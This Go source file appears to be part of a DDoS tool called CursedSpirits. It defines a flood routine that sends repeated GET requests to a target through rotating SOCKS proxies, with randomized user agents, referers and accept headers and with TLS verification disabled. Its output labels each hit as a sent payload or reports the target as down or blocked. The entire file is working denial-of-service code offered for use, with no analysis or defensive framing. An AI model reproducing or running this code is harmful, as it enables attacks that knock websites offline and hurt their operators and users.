package bot

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"time"

	"Pix4Devs/CursedSpirits/globals"

	"github.com/corpix/uarand"
	"h12.io/socks"
)

type (
	FloodCtx struct {
		Target      string
		Concurrency int
		StopAt      int
		Client      *http.Client
		Protocol    string
	}
)

func (ctx *FloodCtx) Jujutsu(proxy string) {
	if int(time.Now().Unix()) >= ctx.StopAt {
		fmt.Println("Forced STOP due to flood duration exceeded given time")
		os.Exit(0)
	}

	ctx.cfg_tp(proxy)

	req, err := http.NewRequest("GET", ctx.Target, nil)
	if err != nil {
		return
	}

	{
		req.Header.Add("cache-control", "must-revalidate")
		req.Header.Add("user-agent", uarand.GetRandom())
		req.Header.Add("referer", globals.REFS[rand.Intn(len(globals.REFS))])
		req.Header.Add("accept", globals.ACCEPTS[rand.Intn(len(globals.ACCEPTS))])
	}

	for i := 0; i < ctx.Concurrency; i++ {
		resp, err := ctx.Client.Do(req)
		if err != nil {
			continue
		}

		if resp.StatusCode >= 200 && resp.StatusCode <= 399 {
			os.Stdout.WriteString(fmt.Sprintf("[SEND PAYLOAD] [---%s---]\r", proxy))
		} else if resp.StatusCode >= 400 && resp.StatusCode <= 599 {
			os.Stdout.WriteString(fmt.Sprintf("[TARGET DOWN OR BLOCK] [---%s---]\r", proxy))
		}

		resp.Body.Close()
	}
}

func (ctx *FloodCtx) cfg_tp(proxy string) {
	ctx.Client.Transport = &http.Transport{
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		Dial:              socks.Dial(fmt.Sprintf("%s://%s?timeout=10s", ctx.Protocol, proxy)),
		ForceAttemptHTTP2: true,
		MaxConnsPerHost:   0,
	}
}
